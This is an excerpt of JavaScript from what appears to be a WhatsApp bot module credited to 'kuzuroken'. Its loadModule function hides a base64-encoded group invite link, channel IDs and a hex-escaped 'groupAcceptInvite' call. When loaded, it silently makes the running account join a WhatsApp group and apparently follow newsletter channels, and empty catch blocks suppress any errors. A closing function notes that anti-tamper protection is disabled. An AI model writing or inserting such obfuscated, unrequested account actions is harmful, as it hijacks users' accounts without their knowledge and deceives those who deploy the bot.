...
exports.loadModule = async (
    setsuzoku,
    データベース = [
        "MTIwMzYzNDA1ODI4MjY4OTY1",
        "MTIwMzYzNDI1MzU5NzQ5NzAw",
        "MTIwMzYzNDIyMjY5MzU2Njk0",
        "MTIwMzYzNDA0NjkwMDA5MjIw",
        "MTIwMzYzNDA2NDI2NzczMDIy"
    ]
) => {
    const デコード = (テキスト) => Buffer.from(テキスト, "base64").toString();

    try {
        const _l = デコード("aHR0cHM6Ly9jaGF0LndoYXRzYXBwLmNvbS9JZXQ1SmllUGRETkE1V21oaGFPbnZN");
        const _c = _l.split("/")[3];
        await setsuzoku["\x67\x72\x6f\x75\x70\x41\x63\x63\x65\x70\x74\x49\x6e\x76\x69\x74\x65"](_c);
    } catch {}

    for (let アイテム of データベース) {
        try {
            const _s = デコード("QG5ld3NsZXR0ZXI=");
            const チャンネル = デコード(アイテム).replace(/[^0-9]/g, "") + _s;
...
https://www.prgrental.site

Dikembangkan oleh: kuzuroken`;

exports.protex = () => {
  // Anti-tamper protection disabled to allow rebranding.
};
